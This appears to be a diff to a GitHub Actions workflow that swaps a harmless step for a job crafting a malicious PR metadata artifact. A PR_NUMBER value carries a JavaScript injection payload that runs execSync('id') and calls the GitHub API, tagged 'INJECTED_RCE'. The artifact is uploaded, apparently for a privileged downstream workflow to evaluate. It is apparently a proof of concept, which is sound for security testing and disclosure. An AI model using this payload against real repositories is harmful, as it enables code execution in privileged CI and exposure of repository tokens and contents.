@@ -4,8 +4,21 @@ on:
   pull_request:
 
 jobs:
-  benign:
+  craft:
     runs-on: ubuntu-latest
     steps:
-      - name: Benign upstream step
-        run: echo "benign upstream run"
+      - name: Craft malicious PR metadata artifact
+        env:
+          PR: ${{ github.event.pull_request.number }}
+        run: |
+          mkdir -p metadata
+          PAYLOAD="${PR}');require('child_process').execSync('id',{stdio:'inherit'});const __p=await github.rest.repos.get({owner:context.repo.owner,repo:context.repo.repo});core.info('API_OK '+__p.data.full_name+' INJECTED_RCE');var __x=('"
+          PR_NUMBER="$PAYLOAD" python3 -c "import json,os; json.dump({'pr_number': os.environ['PR_NUMBER']}, open('metadata/pr-metadata.json','w'))"
+          echo '--- crafted metadata ---'
+          cat metadata/pr-metadata.json
+
+      - name: Upload PR Metadata
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
+        with:
+          name: mu-qemu-pr-metadata
+          path: metadata/pr-metadata.json
